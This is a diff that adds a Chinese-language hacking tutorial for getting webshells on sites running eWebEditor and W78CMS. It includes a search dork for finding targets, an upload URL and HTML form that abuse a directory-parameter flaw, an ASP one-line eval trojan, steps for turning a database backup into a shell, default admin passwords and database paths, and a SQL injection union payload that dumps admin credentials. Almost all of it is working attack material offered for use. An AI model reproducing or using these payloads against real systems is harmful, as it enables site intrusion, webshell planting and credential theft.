@@ -1,0 +1,57 @@
+漏洞很简单，出现在editor上面，大虾应该都知道：
+
+关键词为：inurl:ShopMore.asp?id
+访问这个地址
+http://hackqing.com/nbwebshell/admin/Editor/asp/upload.asp?action=save&type=image&style=popup&cusdir=Hack.asp
+访问这个地址可以建立个Hack.ASP的文件夹……
+再用这个html代码上传。
+
+ 
+
+
+<form action="http://hackqing.com/nbwebshell/admin/Editor/asp/upload.asp?action=save&type=image&style=popup&cusdir=Hack.asp" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=upload>
+</form>
+
+上传之后查看源文件，找到小后门地址
+
+对6.X的也管用，对ASP。aspx。JSP。均管用。
+
+ 
+
+附：W78CMS 漏洞拿shell(Xday)
+
+利用方法有二
+大前提条件：网站目录可写，且未删除文件备份功能
+方法一：
+前提条件：对方未修改数据库的默认地址
+第一步：订购页面，直接在 产品名称，订购数量等输入一句话木马
+<%eval request("ha")%>
+第二步：备份数据库。数据库名为asp文件（这里注意：第一次备份的时候，程序会自动添加.MDB后缀，需要备份两次）注：会弹出要你登陆的框，不要管，再执行一下备份
+第三步：一句话木马连接，上传shell
+
+方法二：
+前提条件：对方未修改EWEB的默认路径
+第一步：直接在EWEB里上传一个图片后缀的木马。
+第二步：备份数据库。数据库名为asp文件（这里注意：第一次备份的时候，程序会自动添加.MDB后缀，需要备份两次）注：会弹出要你登陆的框，不要管，再执行一下备份
+第三步：备份后的就是你的shell了
+
+
+原理
+备份数据库程序文件验证过滤失误，导致程序在验证前先执行了备份数据库。
+而订购信息是直接写入数据库的。
+
+
+此系统的在线编辑登录页面为admin/eWebEditor/admin/login.asp
+默认user:admin   password:198625
+不能进的还可以试试
+
+后台默认密码为86779533 abc123这两个
+
+试试数据库默认地址为/data/#sze7xiaohu.mdb
+
+
+%' and 1=2 union select 1,admin,3,4,5,6,password,8,9,10 from admin where '%'=' 直接丢搜索栏也行
+ 
+
